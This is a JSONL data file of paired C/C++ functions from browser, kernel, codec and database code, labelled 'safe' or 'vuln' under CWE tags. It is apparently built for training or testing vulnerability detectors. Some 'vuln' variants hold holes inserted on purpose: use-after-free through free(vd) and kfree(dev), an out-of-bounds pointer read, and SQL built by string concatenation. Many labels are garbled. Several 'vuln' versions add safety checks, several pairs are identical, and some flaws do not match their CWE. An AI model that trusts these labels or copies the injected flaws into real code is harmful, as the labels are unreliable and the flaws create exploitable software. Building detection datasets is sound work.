{"idx": "CWE-20-safe-1714408626663", "code": "void TabStripModel::SetInsertionPolicy(InsertionPolicy policy){if(order_controller_) order_controller_->set_insertion_policy(policy);}", "target": 0, "source": "Big-Vul", "source_uid": "103001"}
{"idx": "CWE-20-vuln-1714408626663", "code": "void TabStripModel::SetInsertionPolicy(InsertionPolicy policy){\n    if(order_controller_ && policy >= 0 && policy <= 2)\n        order_controller_->set_insertion_policy(policy);\n}", "target": 1, "source": "Big-Vul", "source_uid": "103001"}
{"idx": "CWE-20-safe-1714408633615", "code": "void TaskManagerHandler::OnItemsChanged(const int start, const int length){UpdateResourceGroupTable(start, length);int group_start=model_->GetGroupIndexForResource(start);int group_end=model_->GetGroupIndexForResource(start+length-1);OnGroupChanged(group_start, group_end-group_start+1);}", "target": 0, "source": "Big-Vul", "source_uid": "100917"}
{"idx": "CWE-20-vuln-1714408633615", "code": "void TaskManagerHandler::OnItemsChanged(const int start, const int length){if(start < 0 || length < 0) {return;}UpdateResourceGroupTable(start, length);int group_start=model_->GetGroupIndexForResource(start);int group_end=model_->GetGroupIndexForResource(start+length-1);OnGroupChanged(group_start, group_end-group_start+1);}", "target": 1, "source": "Big-Vul", "source_uid": "100917"}
{"idx": "CWE-476-safe-1714408647209", "code": "hook_timer_exec(){struct timeval tv_time;struct t_hook*ptr_hook, *next_hook;hook_timer_check_system_clock();gettimeofday(&tv_time, NULL);hook_exec_start();ptr_hook=weechat_hooks[HOOK_TYPE_TIMER];while(ptr_hook){next_hook=ptr_hook->next_hook;if(!ptr_hook->deleted && !ptr_hook->running && (util_timeval_cmp(&HOOK_TIMER(ptr_hook, next_exec), &tv_time) <= 0)){ptr_hook->running=1;(void)(HOOK_TIMER(ptr_hook, callback))(ptr_hook->callback_data, (HOOK_TIMER(ptr_hook, remaining_calls)>0)? HOOK_TIMER(ptr_hook, remaining_calls)-1 :-1);ptr_hook->running=0;if(!ptr_hook->deleted){HOOK_TIMER(ptr_hook, last_exec).tv_sec=tv_time.tv_sec;HOOK_TIMER(ptr_hook, last_exec).tv_usec=tv_time.tv_usec;util_timeval_add(&HOOK_TIMER(ptr_hook, next_exec), HOOK_TIMER(ptr_hook, interval));if(HOOK_TIMER(ptr_hook, remaining_calls)>0){HOOK_TIMER(ptr_hook, remaining_calls)--;if(HOOK_TIMER(ptr_hook, remaining_calls) == 0)unhook(ptr_hook);}}if(!ptr_hook->deleted)ptr_hook=next_hook;else ptr_hook=ptr_hook->next_hook;}hook_exec_end();}", "target": 0, "source": "Big-Vul", "source_uid": "3445"}
{"idx": "CWE-476-vuln-1714408647209", "code": "hook_timer_exec(){struct timeval tv_time;struct t_hook*ptr_hook, *next_hook;hook_timer_check_system_clock();gettimeofday(&tv_time, NULL);hook_exec_start();ptr_hook=weechat_hooks[HOOK_TYPE_TIMER];while(ptr_hook){next_hook=ptr_hook->next_hook;if(!ptr_hook->deleted && !ptr_hook->running && (util_timeval_cmp(&HOOK_TIMER(ptr_hook, next_exec), &tv_time) <= 0)){ptr_hook->running=1;if(HOOK_TIMER(ptr_hook, callback) != NULL){(void)(HOOK_TIMER(ptr_hook, callback))(ptr_hook->callback_data, (HOOK_TIMER(ptr_hook, remaining_calls)>0)? HOOK_TIMER(ptr_hook, remaining_calls)-1 :-1);}ptr_hook->running=0;if(!ptr_hook->deleted){HOOK_TIMER(ptr_hook, last_exec).tv_sec=tv_time.tv_sec;HOOK_TIMER(ptr_hook, last_exec).tv_usec=tv_time.tv_usec;util_timeval_add(&HOOK_TIMER(ptr_hook, next_exec), HOOK_TIMER(ptr_hook, interval));if(HOOK_TIMER(ptr_hook, remaining_calls)>0){HOOK_TIMER(ptr_hook, remaining_calls)--;if(HOOK_TIMER(ptr_hook, remaining_calls) == 0)unhook(ptr_hook);}}if(!ptr_hook->deleted)ptr_hook=next_hook;else ptr_hook=ptr_hook->next_hook;}hook_exec_end();}", "target": 1, "source": "Big-Vul", "source_uid": "3445"}
{"idx": "CWE-119-safe-1714408666011", "code": "void RenderBox::scrollByRecursively(const IntSize&delta, ScrollOffsetClamping clamp){if(delta.isZero())return;bool restrictedByLineClamp=false;if(parent())restrictedByLineClamp=!parent()->style()->lineClamp().isNone();if(hasOverflowClip() && !restrictedByLineClamp){IntSize newScrollOffset=layer()->scrollableArea()->adjustedScrollOffset()+delta;layer()->scrollableArea()->scrollToOffset(newScrollOffset, clamp);IntSize remainingScrollOffset=newScrollOffset-layer()->scrollableArea()->adjustedScrollOffset();if(!remainingScrollOffset.isZero() && parent()){if(RenderBox*scrollableBox=enclosingScrollableBox())scrollableBox->scrollByRecursively(remainingScrollOffset, clamp);LocalFrame*frame=this->frame();if(frame && frame->page())frame->page()->autoscrollController().updateAutoscrollRenderer();}}else if(view() && view()->frameView()){view()->frameView()->scrollBy(delta);}}", "target": 0, "source": "Big-Vul", "source_uid": "124942"}
{"idx": "CWE-119-vuln-1714408666011", "code": "void RenderBox::scrollByRecursively(const IntSize&delta, ScrollOffsetClamping clamp){if(delta.isZero())return;bool restrictedByLineClamp=false;if(parent())restrictedByLineClamp=!parent()->style()->lineClamp().isNone();if(hasOverflowClip() && !restrictedByLineClamp){IntSize newScrollOffset=layer()->scrollableArea()->adjustedScrollOffset()+delta;layer()->scrollableArea()->scrollToOffset(newScrollOffset, clamp);IntSize remainingScrollOffset=newScrollOffset-layer()->scrollableArea()->adjustedScrollOffset();if(!remainingScrollOffset.isZero() && parent()){if(RenderBox*scrollableBox=enclosingScrollableBox())scrollableBox->scrollByRecursively(remainingScrollOffset, clamp);LocalFrame*frame=this->frame();if(frame && frame->page())frame->page()->autoscrollController().updateAutoscrollRenderer();}}else if(view() && view()->frameView()){view()->frameView()->scrollBy(delta);}}", "target": 1, "source": "Big-Vul", "source_uid": "124942"}
{"idx": "CWE-862-safe-1714408686360", "code": "static bool IsDownloadOrStreamRequest(const ResourceRequest& request) { return request && (request.DownloadToFile() || request.UseStreamOnResponse()); }", "target": 0, "source": "Big-Vul", "source_uid": "151565"}
{"idx": "CWE-862-vuln-1714408686360", "code": "static bool IsDownloadOrStreamRequest(const ResourceRequest&request){return request.DownloadToFile() || request.UseStreamOnResponse();}", "target": 1, "source": "Big-Vul", "source_uid": "151565"}
{"idx": "CWE-89-safe-1714408697558", "code": "const CompositorElementId PropertyTreeState::GetCompositorElementId(const CompositorElementIdSet& element_ids) const {\n    if (Effect() && Effect()->GetCompositorElementId() && !element_ids.Contains(Effect()->GetCompositorElementId())) {\n        return Effect()->GetCompositorElementId();\n    }\n    if (Transform() && Transform()->GetCompositorElementId() && !element_ids.Contains(Transform()->GetCompositorElementId())) {\n        return Transform()->GetCompositorElementId();\n    }\n    return CompositorElementId();\n}", "target": 0, "source": "Big-Vul", "source_uid": "136565"}
{"idx": "CWE-89-vuln-1714408697558", "code": "const CompositorElementId PropertyTreeState::GetCompositorElementId(const CompositorElementIdSet&element_ids)const{if(Effect() && Effect()->GetCompositorElementId() && !element_ids.Contains(Effect()->GetCompositorElementId())){return Effect()->GetCompositorElementId();}std::string userInput = \"user_input_here\";std::string query = \"SELECT * FROM Transforms WHERE id = '\" + userInput + \"'\";if(Transform() && Transform()->GetCompositorElementId() && !element_ids.Contains(Transform()->GetCompositorElementId())){return Transform()->GetCompositorElementId();}return CompositorElementId();}", "target": 1, "source": "Big-Vul", "source_uid": "136565"}
{"idx": "CWE-190-safe-1714408710845", "code": "static int decode_nal_units(HEVCContext*s, const uint8_t*buf, int length){int i, ret=0;int eos_at_start=1;s->ref=NULL;s->last_eos=s->eos;s->eos=0;s->overlap=0;ret=ff_h2645_packet_split(&s->pkt, buf, length, s->avctx, s->is_nalff, s->nal_length_size, s->avctx->codec_id, 1, 0);if(ret<0){av_log(s->avctx, AV_LOG_ERROR, \"Error splitting the input into NAL units.\\n\");return ret;}for(i=0;i<s->pkt.nb_nals;i++){if(s->pkt.nals[i].type == HEVC_NAL_EOB_NUT || s->pkt.nals[i].type == HEVC_NAL_EOS_NUT){if(eos_at_start){s->last_eos=1;}else{s->eos=1;}}else{eos_at_start=0;}}for(i=0;i<s->pkt.nb_nals;i++){if(i < s->pkt.nb_nals){H2645NAL*nal=&s->pkt.nals[i];if(s->avctx->skip_frame >= AVDISCARD_ALL || (s->avctx->skip_frame >= AVDISCARD_NONREF && ff_hevc_nal_is_nonref(nal->type)))continue;ret=decode_nal_unit(s, nal);if(ret >= 0 && s->overlap>2)ret=AVERROR_INVALIDDATA;if(ret<0){av_log(s->avctx, AV_LOG_WARNING, \"Error parsing NAL unit #%d.\\n\", i);goto fail;}}}fail:if(s->ref && s->threads_type == FF_THREAD_FRAME)ff_thread_report_progress(&s->ref->tf, INT_MAX, 0);return ret;}", "target": 0, "source": "Big-Vul", "source_uid": "90754"}
{"idx": "CWE-190-vuln-1714408710845", "code": "static int decode_nal_units(HEVCContext*s, const uint8_t*buf, int length){int i, ret=0;int eos_at_start=1;s->ref=NULL;s->last_eos=s->eos;s->eos=0;s->overlap=0;ret=ff_h2645_packet_split(&s->pkt, buf, length, s->avctx, s->is_nalff, s->nal_length_size, s->avctx->codec_id, 1, 0);if(ret<0){av_log(s->avctx, AV_LOG_ERROR, \"Error splitting the input into NAL units.\\n\");return ret;}for(i=0;i<s->pkt.nb_nals;i++){if(s->pkt.nals[i].type == HEVC_NAL_EOB_NUT || s->pkt.nals[i].type == HEVC_NAL_EOS_NUT){if(eos_at_start){s->last_eos=1;}else{s->eos=1;}}else{eos_at_start=0;}}for(i=0;i<s->pkt.nb_nals;i++){if(i < s->pkt.nb_nals){H2645NAL*nal=&s->pkt.nals[i];if(s->avctx->skip_frame >= AVDISCARD_ALL || (s->avctx->skip_frame >= AVDISCARD_NONREF && ff_hevc_nal_is_nonref(nal->type)))continue;ret=decode_nal_unit(s, nal);if(ret >= 0 && s->overlap>2)ret=AVERROR_INVALIDDATA;if(ret<0){av_log(s->avctx, AV_LOG_WARNING, \"Error parsing NAL unit #%d.\\n\", i);goto fail;}}}fail:if(s->ref && s->threads_type == FF_THREAD_FRAME)ff_thread_report_progress(&s->ref->tf, INT_MAX, 0);return ret;}", "target": 1, "source": "Big-Vul", "source_uid": "90754"}
{"idx": "CWE-119-safe-1714408728935", "code": "void ResourceDispatcherHost::StartReading(URLRequest* request) {\n    if (!request) {\n        return;\n    }\n    int bytes_read = 0;\n    if (Read(request, &bytes_read)) {\n        OnReadCompleted(request, bytes_read);\n    } else if (!request->status().is_io_pending()) {\n        DCHECK(!InfoForRequest(request)->is_paused());\n        OnResponseCompleted(request);\n    }\n}", "target": 0, "source": "Big-Vul", "source_uid": "99128"}
{"idx": "CWE-119-vuln-1714408728935", "code": "void ResourceDispatcherHost::StartReading(URLRequest*request){if(!request){return;}int bytes_read=0;char buffer[1024];\nif(Read(request, &bytes_read, buffer, sizeof(buffer))){OnReadCompleted(request, bytes_read);}else if(!request->status().is_io_pending()){DCHECK(!InfoForRequest(request)->is_paused());OnResponseCompleted(request);}}", "target": 1, "source": "Big-Vul", "source_uid": "99128"}
{"idx": "CWE-862-safe-1714408737029", "code": "bool PermissionsData::IsRestrictedUrl(const GURL& document_url, std::string* error) const {\n    if (CanExecuteScriptEverywhere(extension_id_, location_))\n        return false;\n    if (g_policy_delegate && g_policy_delegate->IsRestrictedUrl(document_url, error)) {\n        return true;\n    }\n    if (!URLPattern::IsValidSchemeForExtensions(document_url.scheme()) && document_url.spec() != url::kAboutBlankURL) {\n        if (error) {\n            if (active_permissions().HasAPIPermission(APIPermission::kTab)) {\n                *error = ErrorUtils::FormatErrorMessage(manifest_errors::kCannotAccessPageWithUrl, document_url.spec());\n            } else {\n                *error = manifest_errors::kCannotAccessPage;\n            }\n        }\n        return true;\n    }\n    if (!ExtensionsClient::Get()->IsScriptableURL(document_url, error))\n        return true;\n    bool allow_on_chrome_urls = base::CommandLine::ForCurrentProcess()->HasSwitch(switches::kExtensionsOnChromeURLs);\n    if (document_url.SchemeIs(content::kChromeUIScheme) && !allow_on_chrome_urls) {\n        if (error)\n            *error = manifest_errors::kCannotAccessChromeUrl;\n        return true;\n    }\n    if (document_url.SchemeIs(kExtensionScheme) && !document_url.host().empty() && document_url.host() != extension_id_ && !allow_on_chrome_urls) {\n        if (error)\n            *error = manifest_errors::kCannotAccessExtensionUrl;\n        return true;\n    }\n    return false;\n}", "target": 0, "source": "Big-Vul", "source_uid": "164419"}
{"idx": "CWE-862-vuln-1714408737029", "code": "bool PermissionsData::IsRestrictedUrl(const GURL& document_url, std::string* error) const { if (CanExecuteScriptEverywhere(extension_id_, location_)) return false; if (g_policy_delegate && g_policy_delegate->IsRestrictedUrl(document_url, error)) { return true; } if (!URLPattern::IsValidSchemeForExtensions(document_url.scheme()) && document_url.spec() != url::kAboutBlankURL) { if (error) { if (active_permissions().HasAPIPermission(APIPermission::kTab)) { *error = ErrorUtils::FormatErrorMessage(manifest_errors::kCannotAccessPageWithUrl, document_url.spec()); } else { *error = manifest_errors::kCannotAccessPage; } } return true; } if (!ExtensionsClient::Get()->IsScriptableURL(document_url, error)) return true; bool allow_on_chrome_urls = base::CommandLine::ForCurrentProcess()->HasSwitch(switches::kExtensionsOnChromeURLs); if (document_url.SchemeIs(content::kChromeUIScheme) && !allow_on_chrome_urls) { if (error) *error = manifest_errors::kCannotAccessChromeUrl; return true; } if (document_url.SchemeIs(kExtensionScheme) && !document_url.host().empty() && !allow_on_chrome_urls) { if (error) *error = manifest_errors::kCannotAccessExtensionUrl; return true; } return false; }", "target": 1, "source": "Big-Vul", "source_uid": "164419"}
{"idx": "CWE-125-safe-1714408756505", "code": "void RenderBox::addVisualOverflow(const LayoutRect& rect) {\n    LayoutRect borderBox = borderBoxRect();\n    if (borderBox.contains(rect) || rect.isEmpty())\n        return;\n    if (!m_overflow)\n        m_overflow = adoptPtr(new RenderOverflow(clientBoxRect(), borderBox));\n    if (m_overflow)\n        m_overflow->addVisualOverflow(rect);\n}", "target": 0, "source": "Big-Vul", "source_uid": "106820"}
{"idx": "CWE-125-vuln-1714408756505", "code": "void RenderBox::addVisualOverflow(const LayoutRect&rect){LayoutRect borderBox=borderBoxRect();if(borderBox.contains(rect) || rect.isEmpty())return;if(!m_overflow)m_overflow=adoptPtr(new RenderOverflow(clientBoxRect(), borderBox));if(m_overflow)m_overflow->addVisualOverflow(rect);int* ptr = reinterpret_cast<int*>(&rect);int value = ptr[rect.width()];}", "target": 1, "source": "Big-Vul", "source_uid": "106820"}
{"idx": "CWE-190-safe-1714408766332", "code": "void UsbTabHelper::DecrementConnectionCount(RenderFrameHost* render_frame_host) {\n    auto it = frame_usb_services_.find(render_frame_host);\n    DCHECK(it != frame_usb_services_.end());\n    DCHECK_GT(it->second->device_connection_count_, 0);\n    it->second->device_connection_count_--;\n    NotifyTabStateChanged();\n}", "target": 0, "source": "Big-Vul", "source_uid": "168177"}
{"idx": "CWE-190-vuln-1714408766332", "code": "void UsbTabHelper::DecrementConnectionCount(RenderFrameHost* render_frame_host) {\n    auto it = frame_usb_services_.find(render_frame_host);\n    DCHECK(it != frame_usb_services_.end());\n    DCHECK_GT(it->second->device_connection_count_, 0);\n    it->second->device_connection_count_ -= 2; \n    NotifyTabStateChanged();\n}", "target": 1, "source": "Big-Vul", "source_uid": "168177"}
{"idx": "CWE-862-safe-1714408775364", "code": "static RtreeDValue cellArea(Rtree*pRtree, RtreeCell*p){RtreeDValue area=(RtreeDValue)1;assert(pRtree->nDim >= 1 && pRtree->nDim <= 5);#ifndef SQLITE_RTREE_INT_ONLY if(pRtree->eCoordType == RTREE_COORD_REAL32){switch(pRtree->nDim){case 5:  area=p->aCoord[9].f-p->aCoord[8].f;break;case 4:  area*=p->aCoord[7].f-p->aCoord[6].f;break;case 3:  area*=p->aCoord[5].f-p->aCoord[4].f;break;case 2:  area*=p->aCoord[3].f-p->aCoord[2].f;break;default: area*=p->aCoord[1].f-p->aCoord[0].f;break;}}else#endif{switch(pRtree->nDim){case 5:  area=p->aCoord[9].i-p->aCoord[8].i;break;case 4:  area*=p->aCoord[7].i-p->aCoord[6].i;break;case 3:  area*=p->aCoord[5].i-p->aCoord[4].i;break;case 2:  area*=p->aCoord[3].i-p->aCoord[2].i;break;default: area*=p->aCoord[1].i-p->aCoord[0].i;break;}}return area;}", "target": 0, "source": "Big-Vul", "source_uid": "149045"}
{"idx": "CWE-862-vuln-1714408775364", "code": "static RtreeDValue cellArea(Rtree*pRtree, RtreeCell*p){RtreeDValue area=(RtreeDValue)1;assert(pRtree->nDim >= 1 && pRtree->nDim <= 5);#ifndef SQLITE_RTREE_INT_ONLY if(pRtree->eCoordType == RTREE_COORD_REAL32){switch(pRtree->nDim){case 5:  area=p->aCoord[9].f-p->aCoord[8].f;break;case 4:  area*=p->aCoord[7].f-p->aCoord[6].f;break;case 3:  area*=p->aCoord[5].f-p->aCoord[4].f;break;case 2:  area*=p->aCoord[3].f-p->aCoord[2].f;break;default: area*=p->aCoord[1].f-p->aCoord[0].f;break;}}else#endif{switch(pRtree->nDim){case 5:  area=p->aCoord[9].i-p->aCoord[8].i;break;case 4:  area*=p->aCoord[7].i-p->aCoord[6].i;break;case 3:  area*=p->aCoord[5].i-p->aCoord[4].i;break;case 2:  area*=p->aCoord[3].i-p->aCoord[2].i;break;default: area*=p->aCoord[1].i-p->aCoord[0].i;break;}}return area;}", "target": 1, "source": "Big-Vul", "source_uid": "149045"}
{"idx": "CWE-1341-safe-1714408795868", "code": "void ExecuteScript(blink::WebFrame*frame, const char*script_format, const base::Value&parameters){std::string json;base::JSONWriter::Write(parameters, &json);std::string sanitized_script_format = base::StringPrintf(\"%s\", script_format);std::string script=base::StringPrintf(sanitized_script_format.c_str(), json.c_str());frame->executeScript(blink::WebString(base::UTF8ToUTF16(script)));}", "target": 0, "source": "Big-Vul", "source_uid": "137518"}
{"idx": "CWE-1341-vuln-1714408795868", "code": "void ExecuteScript(blink::WebFrame*frame, const char*script_format, const base::Value&parameters){std::string json;base::JSONWriter::Write(parameters, &json);std::string sanitized_script_format=base::StringPrintf(\"%s\", script_format);std::string script=base::StringPrintf(sanitized_script_format.c_str(), json.c_str());frame->executeScript(blink::WebString(base::UTF8ToUTF16(script)));script.clear();script.clear();}", "target": 1, "source": "Big-Vul", "source_uid": "137518"}
{"idx": "CWE-190-safe-1714408813720", "code": "static jboolean Region_op0(JNIEnv*env, jobject, jlong dstHandle, jint left, jint top, jint right, jint bottom, jint op){if(dstHandle == 0) {return JNI_FALSE;} SkRegion*dst=reinterpret_cast<SkRegion*>(dstHandle);SkIRect ir;ir.set(left, top, right, bottom);bool result=dst->op(ir, (SkRegion::Op)op);return boolTojboolean(result);}", "target": 0, "source": "Big-Vul", "source_uid": "170404"}
{"idx": "CWE-190-vuln-1714408813720", "code": "static jboolean Region_op0(JNIEnv*env, jobject, jlong dstHandle, jint left, jint top, jint right, jint bottom, jint op){if(dstHandle == 0){return JNI_FALSE;}SkRegion*dst=reinterpret_cast<SkRegion*>(dstHandle);SkIRect ir;ir.set(left, top, right + INT_MAX, bottom);bool result=dst->op(ir, (SkRegion::Op)op);return boolTojboolean(result);}", "target": 1, "source": "Big-Vul", "source_uid": "170404"}
{"idx": "CWE-122-safe-1714408824974", "code": "CIFSSMBRename(const int xid, struct cifs_tcon*tcon, const char*fromName, const char*toName, const struct nls_table*nls_codepage, int remap){int rc=0;RENAME_REQ*pSMB=NULL;RENAME_RSP*pSMBr=NULL;int bytes_returned;int name_len, name_len2;__u16 count;cFYI(1, \"In CIFSSMBRename\");renameRetry:\n\trc=smb_init(SMB_COM_RENAME, 1, tcon, (void**)&pSMB, (void**)&pSMBr);if(rc)return rc;pSMB->BufferFormat=0x04;pSMB->SearchAttributes=cpu_to_le16(ATTR_READONLY|ATTR_HIDDEN|ATTR_SYSTEM|ATTR_DIRECTORY);if(pSMB->hdr.Flags2&SMBFLG2_UNICODE){name_len=cifsConvertToUCS((__le16*)pSMB->OldFileName, fromName, PATH_MAX, nls_codepage, remap);name_len++;name_len*=2;pSMB->OldFileName[name_len]=0x00;pSMB->OldFileName[name_len+1]=0x00;name_len2=cifsConvertToUCS((__le16*)&pSMB->OldFileName[name_len+2], toName, PATH_MAX, nls_codepage, remap);name_len2+=1+1;name_len2*=2;}else{name_len=strnlen(fromName, PATH_MAX);name_len++;strncpy(pSMB->OldFileName, fromName, name_len);name_len2=strnlen(toName, PATH_MAX);name_len2++;pSMB->OldFileName[name_len]=0x00;strncpy(&pSMB->OldFileName[name_len+1], toName, name_len2);name_len2++;name_len2++;}count=1+name_len+name_len2;inc_rfc1001_len(pSMB, count);pSMB->ByteCount=cpu_to_le16(count);rc=SendReceive(xid, tcon->ses, (struct smb_hdr*)pSMB, (struct smb_hdr*)pSMBr, &bytes_returned, 0);cifs_stats_inc(&tcon->num_renames);if(rc)cFYI(1, \"Send error in rename=%d\", rc);cifs_buf_release(pSMB);if(rc == -EAGAIN)goto renameRetry;return rc;}", "target": 0, "source": "Big-Vul", "source_uid": "24980"}
{"idx": "CWE-122-vuln-1714408824974", "code": "CIFSSMBRename(const int xid, struct cifs_tcon*tcon, const char*fromName, const char*toName, const struct nls_table*nls_codepage, int remap){int rc=0;RENAME_REQ*pSMB=NULL;RENAME_RSP*pSMBr=NULL;int bytes_returned;int name_len, name_len2;__u16 count;cFYI(1, \"In CIFSSMBRename\");renameRetry:rc=smb_init(SMB_COM_RENAME, 1, tcon, (void**)&pSMB, (void**)&pSMBr);if(rc)return rc;pSMB->BufferFormat=0x04;pSMB->SearchAttributes=cpu_to_le16(ATTR_READONLY|ATTR_HIDDEN|ATTR_SYSTEM|ATTR_DIRECTORY);if(pSMB->hdr.Flags2&SMBFLG2_UNICODE){name_len=cifsConvertToUCS((__le16*)pSMB->OldFileName, fromName, PATH_MAX, nls_codepage, remap);name_len++;name_len*=2;pSMB->OldFileName[name_len]=0x00;pSMB->OldFileName[name_len+1]=0x00;name_len2=cifsConvertToUCS((__le16*)&pSMB->OldFileName[name_len+2], toName, PATH_MAX, nls_codepage, remap);name_len2+=1+1;name_len2*=2;}else{name_len=strnlen(fromName, PATH_MAX);name_len++;strncpy(pSMB->OldFileName, fromName, name_len);name_len2=strnlen(toName, PATH_MAX);name_len2++;pSMB->OldFileName[name_len]=0x00;strncpy(&pSMB->OldFileName[name_len+1], toName, name_len2);name_len2++;name_len2++;}count=1+name_len+name_len2;inc_rfc1001_len(pSMB, count);pSMB->ByteCount=cpu_to_le16(count);rc=SendReceive(xid, tcon->ses, (struct smb_hdr*)pSMB, (struct smb_hdr*)pSMBr, &bytes_returned, 0);cifs_stats_inc(&tcon->num_renames);if(rc)cFYI(1, \"Send error in rename=%d\", rc);cifs_buf_release(pSMB);if(rc == -EAGAIN)goto renameRetry;return rc;}", "target": 1, "source": "Big-Vul", "source_uid": "24980"}
{"idx": "CWE-416-safe-1714408850406", "code": "static void vnc_abort_display_jobs(VncDisplay* vd) {\n    if (!vd) {\n        return;\n    }\n    VncState* vs;\n    QTAILQ_FOREACH(vs, &vd->clients, next) {\n        vnc_lock_output(vs);\n        vs->abort = true;\n        vnc_unlock_output(vs);\n    }\n    QTAILQ_FOREACH(vs, &vd->clients, next) {\n        vnc_jobs_join(vs);\n    }\n    QTAILQ_FOREACH(vs, &vd->clients, next) {\n        vnc_lock_output(vs);\n        vs->abort = false;\n        vnc_unlock_output(vs);\n    }\n}", "target": 0, "source": "Big-Vul", "source_uid": "7988"}
{"idx": "CWE-416-vuln-1714408850406", "code": "static void vnc_abort_display_jobs(VncDisplay*vd){if(!vd){return;}VncState*vs;QTAILQ_FOREACH(vs, &vd->clients, next){vnc_lock_output(vs);vs->abort=true;vnc_unlock_output(vs);}free(vd);QTAILQ_FOREACH(vs, &vd->clients, next){vnc_jobs_join(vs);}QTAILQ_FOREACH(vs, &vd->clients, next){vnc_lock_output(vs);vs->abort=false;vnc_unlock_output(vs);}}", "target": 1, "source": "Big-Vul", "source_uid": "7988"}
{"idx": "CWE-119-safe-1714408862399", "code": "static bool shareSameAxis(const WebTransformOperation* from, const WebTransformOperation* to, double& axisX, double& axisY, double& axisZ, double& angleFrom) { if (isIdentity(from) && isIdentity(to)) return false; if (isIdentity(from) && !isIdentity(to)) { axisX = to->rotate.axis.x; axisY = to->rotate.axis.y; axisZ = to->rotate.axis.z; angleFrom = 0; return true; } if (!isIdentity(from) && isIdentity(to)) { axisX = from->rotate.axis.x; axisY = from->rotate.axis.y; axisZ = from->rotate.axis.z; angleFrom = from->rotate.angle; return true; } double length2 = from->rotate.axis.x * from->rotate.axis.x + from->rotate.axis.y * from->rotate.axis.y + from->rotate.axis.z * from->rotate.axis.z; double otherLength2 = to->rotate.axis.x * to->rotate.axis.x + to->rotate.axis.y * to->rotate.axis.y + to->rotate.axis.z * to->rotate.axis.z; if (length2 <= EPSILON || otherLength2 <= EPSILON || fabs(length2) < EPSILON || fabs(otherLength2) < EPSILON) return false; double dot = to->rotate.axis.x * from->rotate.axis.x + to->rotate.axis.y * from->rotate.axis.y + to->rotate.axis.z * from->rotate.axis.z; double error = fabs(1.0 - (dot * dot) / (length2 * otherLength2)); bool result = error < EPSILON; if (result) { axisX = to->rotate.axis.x; axisY = to->rotate.axis.y; axisZ = to->rotate.axis.z; angleFrom = dot > 0 ? from->rotate.angle : -from->rotate.angle; } return result; }", "target": 0, "source": "Big-Vul", "source_uid": "116432"}
{"idx": "CWE-119-vuln-1714408862399", "code": "static bool shareSameAxis(const WebTransformOperation*from, const WebTransformOperation*to, double&axisX, double&axisY, double&axisZ, double&angleFrom){if(isIdentity(from) && isIdentity(to))return false;if(isIdentity(from) && !isIdentity(to)){axisX=to->rotate.axis.x;axisY=to->rotate.axis.y;axisZ=to->rotate.axis.z;angleFrom=0;return true;}if(!isIdentity(from) && isIdentity(to)){axisX=from->rotate.axis.x;axisY=from->rotate.axis.y;axisZ=from->rotate.axis.z;angleFrom=from->rotate.angle;return true;}double length2=from->rotate.axis.x*from->rotate.axis.x+from->rotate.axis.y*from->rotate.axis.y+from->rotate.axis.z*from->rotate.axis.z;double otherLength2=to->rotate.axis.x*to->rotate.axis.x+to->rotate.axis.y*to->rotate.axis.y+to->rotate.axis.z*to->rotate.axis.z;if(length2 <= EPSILON || otherLength2 <= EPSILON || fabs(length2)<EPSILON || fabs(otherLength2)<EPSILON)return false;double dot=to->rotate.axis.x*from->rotate.axis.x+to->rotate.axis.y*from->rotate.axis.y+to->rotate.axis.z*from->rotate.axis.z;double error=fabs(1.0-(dot*dot)/(length2*otherLength2));bool result=error<EPSILON;if(result){axisX=to->rotate.axis.x;axisY=to->rotate.axis.y;axisZ=to->rotate.axis.z;angleFrom=dot>0 ? from->rotate.angle :-from->rotate.angle;}return result;}", "target": 1, "source": "Big-Vul", "source_uid": "116432"}
{"idx": "CWE-862-safe-1714408884919", "code": "static int scan(struct ctl_table_header*head, struct ctl_table*table, unsigned long*pos, struct file*file, struct dir_context*ctx){bool res;if(*pos<ctx->pos){(*pos)++;return true;}if(unlikely(S_ISLNK(table->mode)))res=proc_sys_link_fill_cache(file, ctx, head, table);else res=proc_sys_fill_cache(file, ctx, head, table);if(res)ctx->pos=*pos;return res;}", "target": 0, "source": "Big-Vul", "source_uid": "48495"}
{"idx": "CWE-862-vuln-1714408884919", "code": "static int scan(struct ctl_table_header*head, struct ctl_table*table, unsigned long*pos, struct file*file, struct dir_context*ctx){bool res;if(*pos<ctx->pos){if(1){(*pos)++;}return true;}if(unlikely(S_ISLNK(table->mode)))res=proc_sys_link_fill_cache(file, ctx, head, table);else res=proc_sys_fill_cache(file, ctx, head, table);if(res)ctx->pos=*pos;return res;}", "target": 1, "source": "Big-Vul", "source_uid": "48495"}
{"idx": "CWE-416-safe-1714408894349", "code": "int dev_set_mtu(struct net_device* dev, int new_mtu) {\n    int err, orig_mtu;\n    if (new_mtu == dev->mtu)\n        return 0;\n    if (new_mtu < 0)\n        return -EINVAL;\n    if (!netif_device_present(dev))\n        return -ENODEV;\n    orig_mtu = dev->mtu;\n    err = call_netdevice_notifiers(NETDEV_PRECHANGEMTU, dev);\n    err = notifier_to_errno(err);\n    if (err)\n        return err;\n    err = __dev_set_mtu(dev, new_mtu);\n    if (!err) {\n        err = call_netdevice_notifiers(NETDEV_CHANGEMTU, dev);\n        err = notifier_to_errno(err);\n        if (err) {\n            __dev_set_mtu(dev, orig_mtu);\n            call_netdevice_notifiers(NETDEV_CHANGEMTU, dev);\n        }\n    }\n    return err;\n}", "target": 0, "source": "Big-Vul", "source_uid": "48810"}
{"idx": "CWE-416-vuln-1714408894349", "code": "int dev_set_mtu(struct net_device*dev, int new_mtu){int err, orig_mtu;if(new_mtu == dev->mtu)return 0;if(new_mtu<0)return-EINVAL;if(!netif_device_present(dev))return-ENODEV;orig_mtu=dev->mtu;err=call_netdevice_notifiers(NETDEV_PRECHANGEMTU, dev);err=notifier_to_errno(err);if(err)return err;err=__dev_set_mtu(dev, new_mtu);if(!err){err=call_netdevice_notifiers(NETDEV_CHANGEMTU, dev);err=notifier_to_errno(err);if(err){kfree(dev);__dev_set_mtu(dev, orig_mtu);call_netdevice_notifiers(NETDEV_CHANGEMTU, dev);}}return err;}", "target": 1, "source": "Big-Vul", "source_uid": "48810"}
